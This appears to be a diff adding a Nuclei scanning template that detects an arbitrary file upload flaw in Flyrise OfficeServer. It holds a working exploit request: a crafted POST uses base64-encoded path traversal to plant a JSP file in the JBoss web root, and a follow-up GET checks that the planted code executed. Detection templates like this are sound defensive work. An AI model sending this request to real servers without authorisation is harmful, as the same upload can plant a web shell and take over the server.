@@ -1,0 +1,48 @@
+id: flyrise-enterprise-officeserver-anyfile-upload
+info:
+  name: Flyrise OfficeServer Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100, 1000)}}"
+  t2: "{{base64('../../../jboss/web/fe.war/' + t1 + '.jsp')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /iweboffice/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        DBSTEP V3.0     93                     0        28              DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        RECORDID={{t2}}
+        <%out.println("lOKB4C9g");%>
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - method: GET
+    path:
+      - "/{{t1}}.jsp;.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "lOKB4C9g"
+        part: body
+        condition: and
